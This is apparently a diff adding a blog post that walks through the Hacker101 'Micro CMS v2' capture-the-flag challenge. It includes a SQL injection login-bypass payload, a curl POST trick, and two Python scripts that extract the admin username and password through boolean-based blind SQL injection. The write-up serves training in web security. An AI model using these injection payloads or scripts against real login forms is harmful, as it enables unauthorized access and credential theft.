@@ -1,0 +1,141 @@
+---
+layout: post
+title:  "Micro CMS v2 (Hacker101 CTF Writeup)"
+date:   2020-08-14 8:00:00 +0100
+categories: writeup Hacker101 
+---
+# *Introduction*
+This CTF Challenge is part of Hacker101's Training Platform. The Micro CMS v2 Challenge is a Web security challenge in where we are put in front of a site and we have to find 3 flags. This is how it looks by visiting it:
+
+>>![ls](/assets/MicroCMS.png)
+
+Very basic right? That said, let's get started!
+
+# *Flag 1*
+
+>> Hint: Regular users can only see public pages
+
+As the Hint says, we probably need to get admin access. By Navigating to `Create a new Page` we are welcomed with a login form:
+
+![LoginForm](/assets/LogInForm.png)
+
+Default Credentials like admin:admin or admin:password won't work so let's try [SQLi](https://portswigger.net/web-security/sql-injection). By just inserting a single quotation mark `'` in the username field and clicking `Log In` We get the following error:
+
+```
+Traceback (most recent call last):
+  File "./main.py", line 145, in do_login
+    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
+    self.errorhandler(self, exc, value)
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
+    raise errorvalue
+ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
+```
+
+Awsome! From here we can see the query that is executed and it's something like `SELECT password FROM admins WHERE username='INPUT'` Where the `INPUT` part is whatever we insert in the username field. Probably the query is used to get a Password for a specific user and then comparing it to whatever we insert in the password field. Let's try to craft a query that will return `hello` as password no matter what we have in the username field. After some trials I injected this: `user' UNION SELECT 'hello'#`. The final query will look something like:
+ `SELECT password FROM admins WHERE username='user' UNION SELECT 'hello'#'`. By using the above injection in the username field and the word `hello` in the password...
+
+![Logged](/assets/LoggedInCMS.png)
+
+Nice! By navigating back we get a new `Private Page` that will expose the first flag.
+
+# *Flag 2*
+
+>> Hint: What actions could you perform as a regular user on the last level, which you can't now?
+
+Honestly, I didn't solve this one. I found that this one was a little guessy. However the solution was hidden in the second hint:
+
+>> Hint: Just because request fails with one method doesn't mean it will fail with a different method
+
+So the point here is to change the request method from a simple `GET` to a `POST`. I simply used [curl](https://curl.haxx.se/) to archieve this. The command is `curl -X POST endpoint`. I tested different endpoints on the target and at the end I got the flag by POSTing at `http://34.94.3.143/cd8c2e4456/page/edit/1`.
+
+![Curl](/assets/CURL_posting.png)
+
+
+# *Flag 3*
+
+>> Hint: Credentials are secret, flags are secret. Coincidence?
+
+By reading the hint I got that we have to get the admin's username and password and not just logging in using a bypass like for Flag 1. I thought a bit about this, and finally I came up with a possible approach. Basically when inserting the right password in the login form we obviously log in, otherwise we get an `Wrong Password` Response. So we have a way to ask boolean questions(with answer yes or no) to the database. This "Questions" will be of the form `Does the username start with 'a'?`, `Does the password start with 'ch'?`. By running muliple queries we can get the complete username and the complete password. So how do we do this? We know from the error log that a table `admins` exist. I used the following query : `' union select case when (select substring(username,1,1) ='a') then 'right' else 'wrong' end from admins#`. Let's break this down a bit:
+```
+' # The first question mark breaks the original query
+union select # Union the original query result(that will be empty) with what comes next
+case # start a conditional SQL query
+when (select substring(username,1,1)='a') # check if the first character of the username field is 'a'
+then 'right'  #if it is then return the word 'right'
+else 'wrong' # else return the word 'wrong'
+end # end the conditional SQL query
+from admins # #The username field is in the admins table end the '#' comments out the rest of the original query
+```
+So remember how we set the password to `hello` while solving Flag 1? Here we are basically doing the same, setting the password to `right` or `wrong` based on the result of the query `select substring(username,1,1)='a'`. Obviously we have to run multiple queries and everytime increment the checked substring size. So let's automate this! I Wrote the following python code.
+For the username:
+{% highlight python %}
+import requests
+import string
+url="http://34.94.3.143/9e734fe631/login"
+username=''
+letters=string.ascii_lowercase+string.ascii_uppercase
+c=1
+
+while True:
+    for i in letters:
+        testing=username+i
+        data={
+            'username':"' union select case when (select substring(username,1,"+str(c)+") ='"+testing+"') then 'right' else 'wrong' end from admins#",
+            'password':'right'
+
+
+        }
+        res = requests.post(url,data)
+        #print(data)
+        #print(res.text)
+        if not "Invalid password" in res.text:
+            username=username+i
+            c+=1
+            print(username)
+            break
+{% endhighlight %}
+
+By running the above code, It takes about 30 seconds to split out the entire username. Note that the program won't stop automatically so we have to escape with `CTRL+C`:
+![Getting Username](/assets/GettingUsername_CMS.png)
+
+For the password the code looks very similar:
+{% highlight python %}
+import requests
+import string
+url="http://34.94.3.143/9e734fe631/login"
+password=''
+letters=string.ascii_lowercase+string.ascii_uppercase
+c=1
+
+while True:
+    for i in letters:
+        testing=password+i
+        data={
+            'username':"' union select case when (select substring(password,1,"+str(c)+") ='"+testing+"' where username='charity') then 'right' else 'wrong' end from admins#",
+            'password':'right'
+
+
+        }
+        res = requests.post(url,data)
+        #print(data)
+        #print(res.text)
+        if not "Invalid password" in res.text:
+            password=password+i
+            c+=1
+            print(password)
+            break
+{% endhighlight %}
+
+Note that here I added `where username='charity'` to the query to be sure that we get the password of the previously found user. However this isn't strictly neccessary because it seems that the admin user is only one. At the end the credentials where `username:charity` and `password:keira`.
+By Logging in with the above credentials we immidiatly get the flag on screen! 
+I think this last Flag was the hardest but I had a great time when I finally solved it. Stay tuned for more writeups!
+
+
+
+
+
+
+
+
+
